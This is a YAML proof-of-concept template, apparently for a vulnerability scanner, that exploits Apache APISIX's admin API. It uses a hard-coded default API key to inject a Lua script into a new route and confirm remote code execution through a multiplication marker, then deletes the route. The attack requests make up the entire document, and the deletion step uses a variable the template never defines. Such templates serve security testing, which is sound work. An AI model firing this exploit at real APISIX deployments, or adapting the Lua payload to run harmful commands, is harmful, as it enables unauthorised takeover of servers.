id: poc-yaml-apisix-admin-remote-code-execution
info:
  name: Apache APISIX Admin RCE漏洞
  severity: critical
  tags:
  - rce
  finger: Apache APISIX
  osprey-id: vb_2022_0014
variables:
  r_rand_str: random_str(8)
requests:
- method: GET
  path: /apisix/admin/routes
  headers:
    X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
  expression: contains(body, "\"action\":\"get")
- method: POST
  path: /apisix/admin/routes
  headers:
    X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
    Content-Type: application/json
  data: "{\n    \"uri\": \"/{{.r_rand_str}}\",\n    \"script\": \"local _M = {} \\\
    \\n function _M.access(conf, ctx) \\\\n local os = require('os')\\\\n ngx.say(123*456*789)\
    \  \\\\n end \\\\nreturn _M\",\n    \"upstream\": {\n        \"type\": \"roundrobin\"\
    ,\n        \"nodes\": {\n            \"example.com:80\": 1\n        }\n    }\n\
    }"
  expression: 'status_code == 201 && contains(body, "uri\": \"/{{.r_rand_str}}")

    '
- method: GET
  path: /{{.r_rand_str}}
  expression: 'status_code == 200 && contains(body, "44253432")

    '
- method: DELETE
  path: /apisix/admin/routes/{{.r_route_key}}
  headers:
    X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
  expression: 'status_code == 200 && contains(body, "\"deleted\":\"1\"")

    '
transport: http
